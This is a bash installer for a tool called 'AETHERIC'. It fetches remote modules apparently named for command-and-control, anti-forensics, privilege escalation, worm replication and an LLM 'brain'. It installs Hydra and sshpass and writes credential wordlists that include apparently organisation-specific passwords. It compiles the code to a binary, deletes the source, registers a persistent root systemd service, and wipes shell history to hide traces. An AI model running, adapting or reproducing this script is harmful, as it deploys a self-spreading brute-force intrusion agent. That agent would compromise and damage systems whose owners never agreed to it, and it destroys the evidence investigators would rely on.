#!/bin/bash
# AETHERIC Installation Script – Compiles to binary, removes source
set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
DESTDIR="/usr/local/aetheric"
BIN_PATH="/usr/local/bin/aetheric"

# ------------------------------------------------------------------
# 1. Prepare working directory
# ------------------------------------------------------------------
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# ------------------------------------------------------------------
# 2. Install system dependencies
# ------------------------------------------------------------------

apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# ------------------------------------------------------------------
# 3. Download all source files (explicit list)
# ------------------------------------------------------------------
for file in \
    main.py config.py \
    core/daemonizer.py core/orchestrator.py core/anti_forensics.py core/c2_sync.py core/llm_brain.py \
    modules/network_recon.py modules/file_crawler.py modules/privesc_engine.py modules/attack_planner.py modules/worm_replicator.py modules/process_scraper.py \
    utils/net_utils.py utils/crypto_utils.py utils/logging_utils.py \
    requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

touch core/__init__.py modules/__init__.py utils/__init__.py

# ------------------------------------------------------------------
# 4. Create wordlists for Hydra
# ------------------------------------------------------------------
cat > usernames.txt <<'EOF'
root
admin
user
kmit
ubuntu
tele
ngit
kmec
EOF

cat > passwords.txt <<'EOF'
kmit
root
kmit123
Kmit123$
Kmit@123$
tele123$
tele@123$
kmit@123
Kmit123
Tele123
Tele@123
KMIT123
kmit@123$
root123
root@123
admin
admin123
password
123456
12345678
1234
111111
Qbttxpse!541$$
tele123$
Kmit@123$
Kmit123$
ngit123
ngit@123
Ngit321$
EOF

# ------------------------------------------------------------------
# 5. Copy to permanent location, compile binary, remove source
# ------------------------------------------------------------------
rm -rf "$DESTDIR"
mkdir -p "$DESTDIR"
cp -r . "$DESTDIR/"
cd "$DESTDIR"

# Create virtual environment and install dependencies
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
pip install pyinstaller

# Compile binary
pyinstaller --onefile --name aetheric \
    --hidden-import core \
    --hidden-import modules \
    --hidden-import utils \
    main.py

# Install binary and remove source
cp dist/aetheric "$BIN_PATH"
chmod +x "$BIN_PATH"
cd /
rm -rf "$DESTDIR"
rm -rf "$WORKDIR"

# ------------------------------------------------------------------
# 6. Create systemd service (uses binary)
# ------------------------------------------------------------------
cat > /etc/systemd/system/aetheric.service <<EOF
[Unit]
Description=Aetheric Daemon
After=network.target

[Service]
Type=simple
WorkingDirectory=/tmp
Environment="HYDRA_USERLIST=/usr/local/aetheric/usernames.txt"
Environment="HYDRA_PASSLIST=/usr/local/aetheric/passwords.txt"
ExecStart=$BIN_PATH --resume
Restart=on-failure
RestartSec=10
User=root
MemoryMax=4G
CPUQuota=300%
TimeoutStopSec=300

[Install]
WantedBy=multi-user.target
EOF

# ------------------------------------------------------------------
# 7. Enable and start the service
# ------------------------------------------------------------------
systemctl daemon-reload
systemctl enable aetheric
systemctl start aetheric

# ------------------------------------------------------------------
# 8. Wipe bash history (no traces of the command)
# ------------------------------------------------------------------
unset HISTFILE
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > /root/.bash_history
rm -f ~/.bash_history ~/.bash_logout ~/.bashrc 2>/dev/null
export HISTFILESIZE=0
export HISTSIZE=0

echo "AETHERIC installed successfully (binary only)."
echo "Check status: systemctl status aetheric"
echo "View logs: journalctl -u aetheric -f"